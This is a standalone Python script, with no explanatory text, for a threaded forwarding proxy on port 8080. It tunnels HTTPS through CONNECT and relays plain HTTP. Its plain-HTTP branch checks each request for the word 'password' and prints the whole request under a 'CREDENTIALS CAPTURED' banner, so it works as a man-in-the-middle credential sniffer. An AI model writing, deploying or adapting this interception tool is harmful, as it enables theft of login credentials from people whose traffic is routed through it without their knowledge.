import socket
import select
import threading

def handle_client(client_sock, client_addr):
    try:
        request = client_sock.recv(8192)
        first_line = request.split(b'\r\n')[0].decode(errors='ignore')
        print(f"\n[{client_addr}] {first_line}")

        if first_line.startswith('CONNECT'):
            # ---- HTTPS: tunnel using select ----
            target = first_line.split()[1]
            host, port_str = target.split(':')
            port = int(port_str)
            print(f"[{client_addr}] Tunneling to {host}:{port}")

            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote.connect((host, port))
            client_sock.sendall(b'HTTP/1.1 200 Connection Established\r\n\r\n')

            # Relay using select for both directions
            sockets = [client_sock, remote]
            try:
                while True:
                    rlist, _, xlist = select.select(sockets, [], sockets, 30)
                    if xlist:
                        break
                    for s in rlist:
                        data = s.recv(8192)
                        if not data:
                            raise ConnectionError
                        if s is client_sock:
                            remote.sendall(data)
                        else:
                            client_sock.sendall(data)
            except (ConnectionError, OSError):
                pass
            finally:
                for s in sockets:
                    try:
                        s.close()
                    except OSError:
                        pass
        else:
            # ---- Plain HTTP (unchanged) ----
            lines = request.split(b'\r\n')
            host = None
            for line in lines:
                if line.lower().startswith(b'host:'):
                    host = line.split(b':', 1)[1].strip().decode()
                    break
            if not host:
                client_sock.close()
                return

            if b'password' in request.lower():
                print(f"[!!!] CREDENTIALS CAPTURED:\n{request.decode(errors='ignore')}")

            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote.connect((host, 80))
            remote.sendall(request)

            # Relay response back
            try:
                while True:
                    data = remote.recv(8192)
                    if not data:
                        break
                    client_sock.sendall(data)
            except OSError:
                pass
            finally:
                remote.close()
                client_sock.close()
    except Exception as e:
        print(f"[!!] Error handling {client_addr}: {e}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            client_sock.close()
        except OSError:
            pass

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', 8080))
    srv.listen(10)
    print("[Proxy] Listening on 0.0.0.0:8080")
    while True:
        client, addr = srv.accept()
        threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()

if __name__ == '__main__':
    main()